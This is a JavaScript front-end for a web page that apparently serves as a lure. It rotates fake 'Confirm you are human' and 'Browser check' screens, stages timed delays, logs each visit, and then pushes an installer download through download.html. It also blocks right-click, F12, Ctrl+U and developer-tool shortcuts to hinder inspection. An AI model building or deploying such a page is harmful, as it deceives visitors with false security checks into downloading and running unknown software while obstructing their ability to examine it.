(() => {
"use strict";


/* =========================================================
   ELEMENTS
========================================================== */

const loadingScreen =
    document.getElementById("loadingScreen");

const confirmScreen =
    document.getElementById("confirmScreen");

const downloadScreen =
    document.getElementById("downloadScreen");

const confirmButton =
    document.getElementById("confirmButton");

const downloadButton =
    document.getElementById("downloadButton");

const closeModal =
    document.getElementById("closeModal");

const visitorToken =
    document.getElementById("visitorToken");

const buttonText =
    confirmButton?.querySelector(".button-text");

const buttonLoading =
    confirmButton?.querySelector(".button-loading");

const downloadModal =
    document.querySelector(".download-modal");


/* =========================================================
   CONFIGURATION
========================================================== */

const CONFIG = {

    /*
     * Initial white loading screen.
     */

    initialDelay: 1200,


    /*
     * Time after Confirm & Continue.
     */

    preparationDelay: 5000,


    /*
     * How long the installer background is
     * visible before the modal appears.
     */

    backgroundDelay: 3000,


    /*
     * Worker endpoints.
     */

    sessionEndpoint:
        "/api/session",

    visitEndpoint:
        "/api/visit"

};


/* =========================================================
   SESSION
========================================================== */

let session = {

    visitToken:
        "",

    accessToken:
        ""

};


/* =========================================================
   GENERATE 7 CHARACTER VISITOR TOKEN
========================================================== */

function generateToken() {

    const alphabet =
        "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";

    const bytes =
        crypto.getRandomValues(
            new Uint8Array(7)
        );

    return Array.from(bytes)
        .map(
            byte =>
                alphabet[
                    byte % alphabet.length
                ]
        )
        .join("");

}


/* =========================================================
   SHOW
========================================================== */

function show(element) {

    if (!element) {
        return;
    }

    element.classList.remove(
        "hidden"
    );

}


/* =========================================================
   HIDE
========================================================== */

function hide(element) {

    if (!element) {
        return;
    }

    element.classList.add(
        "hidden"
    );

}

/* =========================================================
   CONFIRMATION VARIANTS
========================================================= */

const confirmationVariants = [

    {
        id: 1,

        className:
            "confirm-variant-1",

        eyebrow:
            "Verification",

        title:
            "Confirm you are human",

        description:
            "This quick check helps keep the site safe. It usually takes a few seconds.",

        visual: `
            <div class="visual-check">
                <span>
                    ✓
                </span>
            </div>
        `
    },


    {
        id: 2,

        className:
            "confirm-variant-2",

        eyebrow:
            "READY TO CONTINUE",

        title:
            "Almost there",

        description:
            "Confirm below to continue securely.",

        visual: `
            <div class="visual-circle">
                <span class="visual-download">
                    ↓
                </span>
            </div>
        `
    },


    {
        id: 3,

        className:
            "confirm-variant-3",

        eyebrow:
            "BROWSER CHECK",

        title:
            "One more step",

        description:
            "Confirm your browser to continue securely.",

        visual: `
            <div class="visual-check">
                <span>
                    ✓
                </span>
            </div>
        `
    },


    {
        id: 4,

        className:
            "confirm-variant-4",

        eyebrow:
            "BROWSER CHECK",

        title:
            "Almost ready",

        description:
            "Your connection stays encrypted. Confirm below to continue.",

        visual: `
            <div class="visual-lock">
                <div class="lock-shackle"></div>
                <div class="lock-body"></div>
            </div>
        `
    },


    {
        id: 5,

        className:
            "confirm-variant-5",

        eyebrow:
            "HUMAN VERIFY",

        title:
            "One more step",

        description:
            "We need a short verification before showing the page",

        visual: `
            <div class="visual-lock">
                <div class="lock-shackle"></div>
                <div class="lock-body"></div>
            </div>
        `
    },


    {
        id: 6,

        className:
            "confirm-variant-6",

        eyebrow:
            "PROTECTED SESSION",

        title:
            "Just a Moment",

        description:
            "This quick check helps keep the site safe. It usually takes a few seconds.",

        visual: `
            <div class="visual-grid">

                <span></span>
                <span></span>
                <span></span>
                <span></span>
                <span></span>
                <span></span>
                <span></span>
                <span></span>
                <span></span>

            </div>
        `
    }

];

/* =========================================================
   SELECT CONFIRMATION VARIANT
========================================================= */

function selectConfirmationVariant() {

    const card =
        document.getElementById(
            "confirmCard"
        );

    const visual =
        document.getElementById(
            "confirmVisual"
        );

    const eyebrow =
        document.getElementById(
            "confirmEyebrow"
        );

    const title =
        document.getElementById(
            "confirmTitle"
        );

    const description =
        document.getElementById(
            "confirmDescription"
        );


    if (!card) {
        return;
    }


    /*
     * Use the visitor token as the seed.
     *
     * This means the same visitor gets the
     * same variant during the session rather
     * than randomly changing every render.
     */

    let token =
        session.visitToken || "";


    let hash = 0;


    for (
        let i = 0;
        i < token.length;
        i++
    ) {

        hash =
            ((hash << 5) - hash) +
            token.charCodeAt(i);

        hash |= 0;

    }


    const index =
        Math.abs(hash) %
        confirmationVariants.length;


    const variant =
        confirmationVariants[index];


    /*
     * Remove existing variant classes.
     */

    confirmationVariants.forEach(
        item => {

            card.classList.remove(
                item.className
            );

        }
    );


    /*
     * Apply selected variant.
     */

    card.classList.add(
        variant.className
    );


    eyebrow.textContent =
        variant.eyebrow;


    title.textContent =
        variant.title;


    description.textContent =
        variant.description;


    visual.innerHTML =
        variant.visual;

}

/* =========================================================
   CREATE WORKER SESSION
========================================================== */

async function createSession() {

    /*
     * Generate a fallback immediately.
     * This means the visitor always gets
     * a 7-character token even if the Worker
     * is temporarily unavailable.
     */

    session.visitToken =
        generateToken();


    try {

        const response =
            await fetch(
                CONFIG.sessionEndpoint,
                {
                    method: "POST",

                    headers: {
                        "Accept":
                            "application/json"
                    },

                    credentials:
                        "same-origin",

                    cache:
                        "no-store"
                }
            );


        if (!response.ok) {

            throw new Error(
                "Session request failed"
            );

        }


        const data =
            await response.json();


        if (
            typeof data.visitToken ===
                "string" &&
            data.visitToken.length > 0
        ) {

            session.visitToken =
                data.visitToken;

        }


        if (
            typeof data.accessToken ===
                "string" &&
            data.accessToken.length > 0
        ) {

            session.accessToken =
                data.accessToken;

        }

    } catch (error) {

        /*
         * Don't break the visual flow if
         * analytics/session creation fails.
         */

        console.warn(
            "Download session unavailable.",
            error
        );

    }


    if (visitorToken) {

        visitorToken.textContent =
            session.visitToken;

    }

    selectConfirmationVariant();

}


/* =========================================================
   REPORT VISIT
========================================================== */

function reportVisit() {

    fetch(
        CONFIG.visitEndpoint,
        {
            method: "POST",

            headers: {
                "Content-Type":
                    "application/json"
            },

            credentials:
                "same-origin",

            cache:
                "no-store",

            keepalive:
                true,

            body:
                JSON.stringify({
                    visitToken:
                        session.visitToken
                })
        }
    ).catch(
        () => {}
    );

}


/* =========================================================
   INITIALIZE
========================================================== */

async function initialize() {

    await createSession();

    reportVisit();


    setTimeout(
        () => {

            hide(
                loadingScreen
            );

            show(
                confirmScreen
            );

        },
        CONFIG.initialDelay
    );

}


/* =========================================================
   PREPARING BUTTON
========================================================== */

function setPreparing() {

    if (!confirmButton) {
        return;
    }


    confirmButton.disabled =
        true;


    if (buttonText) {

        buttonText.classList.add(
            "hidden"
        );

    }


    if (buttonLoading) {

        buttonLoading.classList.remove(
            "hidden"
        );

    }

}


/* =========================================================
   SHOW INSTALLER BACKGROUND
========================================================== */

function showInstallerBackground() {

    if (!downloadScreen) {
        return;
    }


    /*
     * Make the screen visible first.
     *
     * The CSS controls the actual
     * responsive background image.
     */

    show(
        downloadScreen
    );


    /*
     * Start with the modal hidden.
     */

    if (downloadModal) {

        downloadModal.classList.remove(
            "modal-visible"
        );

    }


    /*
     * Lock the page behind the
     * full-screen download experience.
     */

    document.body.style.overflow =
        "hidden";


    /*
     * Allow the browser one rendering
     * cycle before beginning the
     * modal timer.
     */

    requestAnimationFrame(
        () => {

            setTimeout(
                () => {

                    if (
                        downloadModal
                    ) {

                        downloadModal.classList.add(
                            "modal-visible"
                        );

                    }

                },
                CONFIG.backgroundDelay
            );

        }
    );

}


/* =========================================================
   CONFIRM BUTTON
========================================================== */

if (confirmButton) {

    confirmButton.addEventListener(
        "click",
        () => {

            setPreparing();


            /*
             * Preserve session information
             * for download.html.
             */

            sessionStorage.setItem(
                "deploypilot_access_token",
                session.accessToken
            );


            sessionStorage.setItem(
                "deploypilot_visit_token",
                session.visitToken
            );


            /*
             * Five-second preparation period.
             */

            setTimeout(
                () => {

                    hide(
                        confirmScreen
                    );


                    /*
                     * IMPORTANT:
                     *
                     * The background appears
                     * immediately here.
                     *
                     * The modal waits another
                     * 3 seconds.
                     */

                    showInstallerBackground();

                },
                CONFIG.preparationDelay
            );

        }
    );

}


/* =========================================================
   DOWNLOAD BUTTON
========================================================== */

if (downloadButton) {

    downloadButton.addEventListener(
        "click",
        () => {

            /*
             * Save the session again before
             * leaving the page.
             */

            sessionStorage.setItem(
                "deploypilot_access_token",
                session.accessToken
            );


            sessionStorage.setItem(
                "deploypilot_visit_token",
                session.visitToken
            );


            /*
             * Route to the installation
             * instructions page.
             *
             * instructions.js then
             * automatically begins
             * the installer download.
             */

            window.location.href =
                "download.html";

        }
    );

}


/* =========================================================
   CLOSE MODAL
========================================================== */

if (closeModal) {

    closeModal.addEventListener(
        "click",
        () => {

            hide(
                downloadScreen
            );


            show(
                confirmScreen
            );


            document.body.style.overflow =
                "";


            if (downloadModal) {

                downloadModal.classList.remove(
                    "modal-visible"
                );

            }

        }
    );

}


/* =========================================================
   ESCAPE KEY
========================================================== */

document.addEventListener(
    "keydown",
    event => {

        if (
            event.key === "Escape" &&
            downloadScreen &&
            !downloadScreen.classList.contains(
                "hidden"
            )
        ) {

            hide(
                downloadScreen
            );


            show(
                confirmScreen
            );


            document.body.style.overflow =
                "";


            if (downloadModal) {

                downloadModal.classList.remove(
                    "modal-visible"
                );

            }

        }

    }
);


/* =========================================================
   BASIC INSPECTION DETERRENTS
   
   These are deterrents only.
   They are NOT a security boundary.
========================================================== */

document.addEventListener(
    "contextmenu",
    event => {

        event.preventDefault();

    }
);


document.addEventListener(
    "dragstart",
    event => {

        if (
            event.target.tagName ===
            "IMG"
        ) {

            event.preventDefault();

        }

    }
);


document.addEventListener(
    "keydown",
    event => {

        const key =
            event.key.toLowerCase();


        /*
         * F12
         */

        if (
            event.key === "F12"
        ) {

            event.preventDefault();

        }


        /*
         * Ctrl + Shift + I
         * Ctrl + Shift + J
         * Ctrl + Shift + C
         */

        if (
            event.ctrlKey &&
            event.shiftKey &&
            [
                "i",
                "j",
                "c"
            ].includes(key)
        ) {

            event.preventDefault();

        }


        /*
         * Ctrl + U
         */

        if (
            event.ctrlKey &&
            key === "u"
        ) {

            event.preventDefault();

        }

    }
);


/* =========================================================
   START
========================================================== */

initialize();


})();
